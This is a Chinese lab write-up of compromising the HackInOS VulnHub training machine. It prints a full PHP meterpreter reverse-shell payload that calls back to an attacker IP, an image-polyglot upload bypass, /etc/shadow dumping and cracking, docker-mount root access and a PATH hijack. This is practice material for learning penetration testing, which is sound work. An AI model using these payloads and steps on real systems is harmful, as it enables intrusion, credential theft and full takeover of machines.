---
title: 渗透思路HackInOS
date: 2020-04-14 21:11:55
categories:
- 安全
- 环境
tags:
- 部署
typora-root-url: ./
---

# 渗透思路HackInOS

来自： https://bbs.pediy.com/thread-252599.htm

<!-- more -->

## 简介

HackinOS是一个渗透靶机，模拟真实的渗透环境，方便我们练习渗透方法，靶机下载[地址](https://www.vulnhub.com/entry/hackinos-1,295/#download)...
攻击者：kali
受害者：HackInOS

## 渗透步骤

### 1.获取目标机器ip

因为我的靶机在虚拟机中网络用的NAT模式，所以靶机IP肯定和kali在同一个网络下，先利用nmap来扫描一波：
![818602_UV22EB2MF76SZ48](/blog.github.io/images/818602_UV22EB2MF76SZ48.png)
![818602_SQJK8T83VP53HP9](/blog.github.io/images/818602_SQJK8T83VP53HP9.png)
很明显，我们找到了目标机器的ip：192.168.88.133，并且发现开启了22和8000端口，在8000端口下面是一个http服务，而且有一个upload.php文件，猜测这里有一个上传文件漏洞....

### 2.利用文件上传漏洞

访问这个地址，确实发现有文件上传的功能：
![818602_ZE9KRDY6J2Q7NY5](/blog.github.io/images/818602_ZE9KRDY6J2Q7NY5.png)
然后我们右键查看源码，发现了一个hint：
![818602_WTZ4NMUU6G2CP6Z](/blog.github.io/images/818602_WTZ4NMUU6G2CP6Z.png)
给了我们一个guthub的[连接](https://github.com/fatihhcelik/Vulnerable-Machine---Hint)，我们访问发现：

```
<!DOCTYPE html>
<html>
 
<body>
 
<div align="center">
<form action="" method="post" enctype="multipart/form-data">
    <br>
    <b>Select image : </b>
    <input type="file" name="file" id="file" style="border: solid;">
    <input type="submit" value="Submit" name="submit">
</form>
</div>
<?php
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $rand_number = rand(1,100);
    $target_dir = "uploads/";
    $target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
    $file_name = $target_dir . basename($_FILES["file"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));
    $type = $_FILES["file"]["type"];
    $check = getimagesize($_FILES["file"]["tmp_name"]);
    if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){
        $uploadOk = 1;
    }else{
        $uploadOk = 0;
        echo ":)";
    }
  if($uploadOk == 1){
      move_uploaded_file($_FILES["file"]["tmp_name"], $target_file.".".$imageFileType);
      echo "File uploaded /uploads/?";
  }
}
?>
 
</body>
</html>
```

给了我们上传文件的源码，通过审查我们发现，只允许上传PNG或GIF格式的图片，校验方式是校验文件内容（实际校验的是文件开头几个标志文件类型的字节，PNG格式为0x890x500x4E0x470x0D0x0A0x1A0x0A，GIF格式为GIF98)，没有校验文件后缀;然后通过校验的文件会保存在uploads目录中，但是文件名是一个随机生成的md5值，而后缀保持上传文件的后缀不变....
所以我们可以先做一个图片马，主要是反弹shell的马,我们利用Metasploit来生成：

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.88.130 lport=4444 -f raw
```

![818602_PSD29T2Z29J3TXN](/blog.github.io/images/818602_PSD29T2Z29J3TXN.png)
把生成的payload：

```
/*<?php /**/ error_reporting(0); $ip = '192.168.88.130'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

保存在hack.php中，然后随便找一个png图片，将hack.php添加到图片中去,然后将png图片后缀改为php：

```
cat hack.php >> best.png
mv best.png sir.php
```

然后我们可以写一个python脚本来帮助我们找到并访问我们上传的木马：

```
import hashlib
import requests
for i in range(101):
    file_name = hashlib.md5('sir.php'+str(i)).hexdigest()
    r = requests.get('http://192.168.88.133:8000/uploads/{}.php'.format(file_name))
```

然后我们设置好我们的msfconsole，等待反弹shell的连接：

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.88.130
lhost => 192.168.88.130
msf5 exploit(multi/handler) > exploit
```

![818602_TZCTQVZR4AUY82Q](/blog.github.io/images/818602_TZCTQVZR4AUY82Q.png)
然后我们就可以去网站上去上传木马，然后运行python脚本，然后看到我们已经获得了一个shell：
![818602_GAQ3TURHMVPA2KB](/blog.github.io/images/818602_GAQ3TURHMVPA2KB.png)
但是我们的权限很低.....

### 提权1

我们在Web目录中找到Wordpress的配置文件wp-config.php，看到了数据库连接信息：

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
 
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');
 
/** MySQL database username */
define('DB_USER', 'wordpress');
 
/** MySQL database password */
define('DB_PASSWORD', 'wordpress');
 
/** MySQL hostname */
define('DB_HOST', 'db:3306');
 
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
 
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
 
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'b68c5e8cad4c8f8367efe2db89d7865e894d037d');
define('SECURE_AUTH_KEY',  'a7b32014b1898077ebe554d7284482aebeac92ae');
define('LOGGED_IN_KEY',    'e8b6f6b9b86e78127b8bfce51ed90151335d0140');
define('NONCE_KEY',        '39f17a336c6000ca5d7929be883be09131dc31e1');
define('AUTH_SALT',        'dbf7b92510a931b835a8b82eec8fd1adbaad487f');
define('SECURE_AUTH_SALT', '632f4f59a75363a72b7b526d8b69718fc89a5c07');
define('LOGGED_IN_SALT',   '614056ec3ba0011dcdb83422b44238045627750e');
define('NONCE_SALT',       '48e539381259ccc664202943d14359572f23638b');
 
/**#@-*/
 
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';
 
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);
 
// If we're behind a proxy server and using HTTPS, we need to alert Wordpress of that fact
// see also http://codex.wordpress.org/Administration_Over_SSL#Using_a_Reverse_Proxy
if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
    $_SERVER['HTTPS'] = 'on';
}
 
/* That's all, stop editing! Happy blogging. */
 
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
    define('ABSPATH', dirname(__FILE__) . '/');
 
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

然后我们上传一个Linux提权信息收集脚本linuxprivchecker.py：
![818602_6Q99PGQ99APHXZ5](/blog.github.io/images/818602_6Q99PGQ99APHXZ5.png)
然后运行这个脚本：

```
meterpreter > chmod 744 /tmp/linuxprivchecker.py
meterpreter > shell
Process 141 created.
Channel 10 created.
python /tmp/linuxprivchecker.py
```

![818602_DUD3N4UGT8UWPK3](/blog.github.io/images/818602_DUD3N4UGT8UWPK3.png)
仔细阅读脚本输出的内容，我们发现到tail被设置了SUID：
![818602_AENTPTZY5EY5R64](/blog.github.io/images/818602_AENTPTZY5EY5R64.png)
直接用tail读取shadow文件：

```
meterpreter > shell
Process 344 created.
Channel 3 created.
tail -c1G /etc/shadow
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
daemon:*:17931:0:99999:7:::
bin:*:17931:0:99999:7:::
sys:*:17931:0:99999:7:::
sync:*:17931:0:99999:7:::
games:*:17931:0:99999:7:::
man:*:17931:0:99999:7:::
lp:*:17931:0:99999:7:::
mail:*:17931:0:99999:7:::
news:*:17931:0:99999:7:::
uucp:*:17931:0:99999:7:::
proxy:*:17931:0:99999:7:::
www-data:*:17931:0:99999:7:::
backup:*:17931:0:99999:7:::
list:*:17931:0:99999:7:::
irc:*:17931:0:99999:7:::
gnats:*:17931:0:99999:7:::
nobody:*:17931:0:99999:7:::
_apt:*:17931:0:99999:7:::
```

![818602_NQF3TADYEZBV9W9](/blog.github.io/images/818602_NQF3TADYEZBV9W9.png)
这里得到了root用户密码的hash值，我们先把hash值保存到文件root.hash中，然后利用hashcat破解它：

```
root@kali:~# hashcat -w 3 -a 0 -m 1800 -o root.out root.hash /usr/share/metasploit-framework/data/wordlists/common_roots.txt --force
```

得到密码：john

```
root@kali:~# cat root.out
$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:john
```

于是我们su root，但是发现：

```
su root
su: must be run from a terminal
```

所以我们用python伪造一个终端，然后来su root:

```
python -c "import pty;pty.spawn('/bin/bash');"
```

![818602_GFGWBKCNDU8JZEH](/blog.github.io/images/818602_GFGWBKCNDU8JZEH.png)
然后拿到了flag:

```
root@1afdd1f6b82c:/var/www/html# cd
cd
root@1afdd1f6b82c:~# ls
ls
flag
root@1afdd1f6b82c:~# cat flag
cat flag
Life consists of details..
```

### 横向渗透

很明显这不是真正的flag，我们刚才还得到了一个数据库密码，所以我们登录看看：
![818602_2QF62MW9W7659XG](/blog.github.io/images/818602_2QF62MW9W7659XG.png)
我们这里发现一个用户名和密码，之前扫描端口是发现一个22端口，所以这个可能是ssh的登录信息，这个密码md5解密出来后是123456；
我们登录试试：
![818602_APP4J4WFDRXJ39Y](/blog.github.io/images/818602_APP4J4WFDRXJ39Y.png)
登录成功，但是我们发现权限还是低，所以这里又要提权....

### 提取2

我们看这个用户名特别像在docker里面，查看一下：

```
hummingbirdscyber@vulnvm:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
```

确实是，因为docker权限就能读到/root中的文件了，所以可以利用docker run的-v参数，将/root挂载到容器中：

```
docker run -it -v /root:/root ubuntu:latest /bin/bash
```

成功获得flag:
![818602_Y3D2DAYVX29YT82](/blog.github.io/images/818602_Y3D2DAYVX29YT82.png)

### 命令劫持

其实最后一个提取，我们还可以利用命令劫持的方法，因为我们发现在目标机器的desktop上面有一个程序，运行之后会输出root字样，然后用strings命令还看到了whoami字样：
![818602_G78B4JY8YZ7J62T](/blog.github.io/images/818602_G78B4JY8YZ7J62T.png)
所以，我们猜测这个程序是root权限并且程序里面掉用了system("whoami")命令，所以我们可以把想办法把whoami这个命令在机器上替换为system("/bin/bash")，利用pwn的思想来提取；
查找一下PATH的位置：
![818602_MCW3EXHE98THGFB](/blog.github.io/images/818602_MCW3EXHE98THGFB.png)
现在命令劫持就非常方便了；
whoami.c:

```
#include <stdlib.h>
int main(void) {
    system("/bin/bash");
    return 0;
}
```

然后我们编译它得到可执行文件whoami，然后在创建一个bin文件夹，将whoami放进去：
![818602_E4QQPF2ZCAUU27Y](/blog.github.io/images/818602_E4QQPF2ZCAUU27Y.png)
最后运行a.out程序即可提取：
![818602_7R2C4QTNKTCMFF7](/blog.github.io/images/818602_7R2C4QTNKTCMFF7.png)